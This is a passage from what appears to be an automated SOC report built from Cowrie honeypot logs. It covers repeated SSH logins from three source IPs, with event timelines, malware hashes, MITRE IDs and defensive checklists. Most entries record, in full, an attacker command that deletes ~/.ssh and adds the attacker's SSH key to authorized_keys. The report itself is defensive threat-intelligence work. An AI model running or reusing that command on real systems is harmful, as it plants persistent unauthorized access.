| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:18 |
| **Last Seen** | 2026-04-21 05:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:18:15` | `cowrie.session.connect` |
| `2026-04-21 05:18:15` | `cowrie.client.version` |
| `2026-04-21 05:18:15` | `cowrie.client.kex` |
| `2026-04-21 05:18:15` | `cowrie.login.success` |
| `2026-04-21 05:18:16` | `cowrie.session.params` |
| `2026-04-21 05:18:16` | `cowrie.command.input` |
| `2026-04-21 05:18:16` | `cowrie.command.failed` |
| `2026-04-21 05:18:16` | `cowrie.log.closed` |
| `2026-04-21 05:18:16` | `cowrie.session.params` |
| `2026-04-21 05:18:16` | `cowrie.command.input` |
| `2026-04-21 05:18:16` | `cowrie.session.file_download` |
| `2026-04-21 05:18:16` | `cowrie.log.closed` |
| `2026-04-21 05:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4632d01094f

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:18 |
| **Last Seen** | 2026-04-21 05:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:18:18` | `cowrie.session.connect` |
| `2026-04-21 05:18:18` | `cowrie.client.version` |
| `2026-04-21 05:18:19` | `cowrie.client.kex` |
| `2026-04-21 05:18:19` | `cowrie.login.success` |
| `2026-04-21 05:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce7832866d5a

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:19 |
| **Last Seen** | 2026-04-21 05:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:19:21` | `cowrie.session.connect` |
| `2026-04-21 05:19:21` | `cowrie.client.version` |
| `2026-04-21 05:19:21` | `cowrie.client.kex` |
| `2026-04-21 05:19:22` | `cowrie.login.success` |
| `2026-04-21 05:19:22` | `cowrie.session.params` |
| `2026-04-21 05:19:22` | `cowrie.command.input` |
| `2026-04-21 05:19:22` | `cowrie.command.failed` |
| `2026-04-21 05:19:23` | `cowrie.log.closed` |
| `2026-04-21 05:19:23` | `cowrie.session.params` |
| `2026-04-21 05:19:23` | `cowrie.command.input` |
| `2026-04-21 05:19:23` | `cowrie.session.file_download` |
| `2026-04-21 05:19:23` | `cowrie.log.closed` |
| `2026-04-21 05:19:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9612227b63e

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:19 |
| **Last Seen** | 2026-04-21 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:19:25` | `cowrie.session.connect` |
| `2026-04-21 05:19:25` | `cowrie.client.version` |
| `2026-04-21 05:19:25` | `cowrie.client.kex` |
| `2026-04-21 05:19:26` | `cowrie.login.success` |
| `2026-04-21 05:19:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38035add99a7

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:19 |
| **Last Seen** | 2026-04-21 05:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:19:48` | `cowrie.session.connect` |
| `2026-04-21 05:19:48` | `cowrie.client.version` |
| `2026-04-21 05:19:48` | `cowrie.client.kex` |
| `2026-04-21 05:19:49` | `cowrie.login.success` |
| `2026-04-21 05:19:50` | `cowrie.session.params` |
| `2026-04-21 05:19:50` | `cowrie.command.input` |
| `2026-04-21 05:19:50` | `cowrie.command.failed` |
| `2026-04-21 05:19:50` | `cowrie.log.closed` |
| `2026-04-21 05:19:50` | `cowrie.session.params` |
| `2026-04-21 05:19:50` | `cowrie.command.input` |
| `2026-04-21 05:19:51` | `cowrie.session.file_download` |
| `2026-04-21 05:19:51` | `cowrie.log.closed` |
| `2026-04-21 05:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b832b1e7df68

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:19 |
| **Last Seen** | 2026-04-21 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:19:53` | `cowrie.session.connect` |
| `2026-04-21 05:19:53` | `cowrie.client.version` |
| `2026-04-21 05:19:53` | `cowrie.client.kex` |
| `2026-04-21 05:19:54` | `cowrie.login.success` |
| `2026-04-21 05:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13533e626146

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:19 |
| **Last Seen** | 2026-04-21 05:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:19:54` | `cowrie.session.connect` |
| `2026-04-21 05:19:54` | `cowrie.client.version` |
| `2026-04-21 05:19:54` | `cowrie.client.kex` |
| `2026-04-21 05:19:55` | `cowrie.login.success` |
| `2026-04-21 05:19:55` | `cowrie.session.params` |
| `2026-04-21 05:19:55` | `cowrie.command.input` |
| `2026-04-21 05:19:55` | `cowrie.command.failed` |
| `2026-04-21 05:19:55` | `cowrie.log.closed` |
| `2026-04-21 05:19:56` | `cowrie.session.params` |
| `2026-04-21 05:19:56` | `cowrie.command.input` |
| `2026-04-21 05:19:56` | `cowrie.session.file_download` |
| `2026-04-21 05:19:56` | `cowrie.log.closed` |
| `2026-04-21 05:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56e4966bbe6a

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:19 |
| **Last Seen** | 2026-04-21 05:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:19:58` | `cowrie.session.connect` |
| `2026-04-21 05:19:58` | `cowrie.client.version` |
| `2026-04-21 05:19:58` | `cowrie.client.kex` |
| `2026-04-21 05:19:59` | `cowrie.login.success` |
| `2026-04-21 05:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70da63e5275b

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:21 |
| **Last Seen** | 2026-04-21 05:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:21:08` | `cowrie.session.connect` |
| `2026-04-21 05:21:08` | `cowrie.client.version` |
| `2026-04-21 05:21:08` | `cowrie.client.kex` |
| `2026-04-21 05:21:09` | `cowrie.login.success` |
| `2026-04-21 05:21:09` | `cowrie.session.params` |
| `2026-04-21 05:21:09` | `cowrie.command.input` |
| `2026-04-21 05:21:09` | `cowrie.command.failed` |
| `2026-04-21 05:21:10` | `cowrie.log.closed` |
| `2026-04-21 05:21:10` | `cowrie.session.params` |
| `2026-04-21 05:21:10` | `cowrie.command.input` |
| `2026-04-21 05:21:10` | `cowrie.session.file_download` |
| `2026-04-21 05:21:10` | `cowrie.log.closed` |
| `2026-04-21 05:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e539a0d4a4fe

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:21 |
| **Last Seen** | 2026-04-21 05:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:21:12` | `cowrie.session.connect` |
| `2026-04-21 05:21:12` | `cowrie.client.version` |
| `2026-04-21 05:21:12` | `cowrie.client.kex` |
| `2026-04-21 05:21:13` | `cowrie.login.success` |
| `2026-04-21 05:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8ffbd0a7c05

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:21 |
| **Last Seen** | 2026-04-21 05:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:21:14` | `cowrie.session.connect` |
| `2026-04-21 05:21:14` | `cowrie.client.version` |
| `2026-04-21 05:21:14` | `cowrie.client.kex` |
| `2026-04-21 05:21:15` | `cowrie.login.success` |
| `2026-04-21 05:21:15` | `cowrie.session.params` |
| `2026-04-21 05:21:15` | `cowrie.command.input` |
| `2026-04-21 05:21:15` | `cowrie.command.failed` |
| `2026-04-21 05:21:15` | `cowrie.log.closed` |
| `2026-04-21 05:21:16` | `cowrie.session.params` |
| `2026-04-21 05:21:16` | `cowrie.command.input` |
| `2026-04-21 05:21:16` | `cowrie.session.file_download` |
| `2026-04-21 05:21:16` | `cowrie.log.closed` |
| `2026-04-21 05:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc076b57eca3

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:21 |
| **Last Seen** | 2026-04-21 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:21:19` | `cowrie.session.connect` |
| `2026-04-21 05:21:19` | `cowrie.client.version` |
| `2026-04-21 05:21:20` | `cowrie.client.kex` |
| `2026-04-21 05:21:20` | `cowrie.login.success` |
| `2026-04-21 05:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f39ef0232520

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:21 |
| **Last Seen** | 2026-04-21 05:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:21:42` | `cowrie.session.connect` |
| `2026-04-21 05:21:42` | `cowrie.client.version` |
| `2026-04-21 05:21:42` | `cowrie.client.kex` |
| `2026-04-21 05:21:43` | `cowrie.login.success` |
| `2026-04-21 05:21:43` | `cowrie.session.params` |
| `2026-04-21 05:21:43` | `cowrie.command.input` |
| `2026-04-21 05:21:43` | `cowrie.command.failed` |
| `2026-04-21 05:21:43` | `cowrie.log.closed` |
| `2026-04-21 05:21:43` | `cowrie.session.params` |
| `2026-04-21 05:21:43` | `cowrie.command.input` |
| `2026-04-21 05:21:44` | `cowrie.session.file_download` |
| `2026-04-21 05:21:44` | `cowrie.log.closed` |
| `2026-04-21 05:21:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af27a59ec293

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:21 |
| **Last Seen** | 2026-04-21 05:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:21:46` | `cowrie.session.connect` |
| `2026-04-21 05:21:46` | `cowrie.client.version` |
| `2026-04-21 05:21:46` | `cowrie.client.kex` |
| `2026-04-21 05:21:46` | `cowrie.login.success` |
| `2026-04-21 05:21:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f412b2e86fe3

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:22 |
| **Last Seen** | 2026-04-21 05:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:22:57` | `cowrie.session.connect` |
| `2026-04-21 05:22:57` | `cowrie.client.version` |
| `2026-04-21 05:22:57` | `cowrie.client.kex` |
| `2026-04-21 05:22:58` | `cowrie.login.success` |
| `2026-04-21 05:22:58` | `cowrie.session.params` |
| `2026-04-21 05:22:58` | `cowrie.command.input` |
| `2026-04-21 05:22:58` | `cowrie.command.failed` |
| `2026-04-21 05:22:58` | `cowrie.log.closed` |
| `2026-04-21 05:22:59` | `cowrie.session.params` |
| `2026-04-21 05:22:59` | `cowrie.command.input` |
| `2026-04-21 05:22:59` | `cowrie.session.file_download` |
| `2026-04-21 05:22:59` | `cowrie.log.closed` |
| `2026-04-21 05:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fce0b78cfc6

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:23 |
| **Last Seen** | 2026-04-21 05:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:23:01` | `cowrie.session.connect` |
| `2026-04-21 05:23:01` | `cowrie.client.version` |
| `2026-04-21 05:23:01` | `cowrie.client.kex` |
| `2026-04-21 05:23:02` | `cowrie.login.success` |
| `2026-04-21 05:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7743dd332431

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:23 |
| **Last Seen** | 2026-04-21 05:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:23:30` | `cowrie.session.connect` |
